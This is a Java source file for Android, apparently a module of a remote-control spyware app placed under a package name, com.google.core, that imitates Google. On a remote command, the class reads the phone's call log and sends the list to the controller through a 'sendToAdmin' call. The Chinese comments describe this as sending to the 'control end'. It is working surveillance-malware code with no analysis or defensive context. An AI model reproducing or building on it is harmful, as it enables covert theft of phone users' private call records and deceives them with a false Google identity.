package com.google.core.msgpro;

import java.util.List;

import com.alibaba.fastjson.JSONObject;
import com.google.core.dao.CallsDao;
import com.google.core.domain.CallsLog;
import com.google.core.domain.MsgType;
import com.google.core.utils.MsgUtils;

import android.content.Context;

public class CallsLogMsgPro {

	private Context context;
	private CallsDao callsDao;

	public CallsLogMsgPro(Context context) {
		this.context = context;
		callsDao = new CallsDao(context);

	}

	public void doPro(int type, String data) {
		switch (type) {
		case MsgType.READ_CALLS_LOG:
			// 读通话记录
			List<CallsLog> list = callsDao.list();
			// 发送给控制端
			MsgUtils.sendToAdmin(context, MsgType.CALLS_LOG_LIST, list);
			break;
		}
	}

}
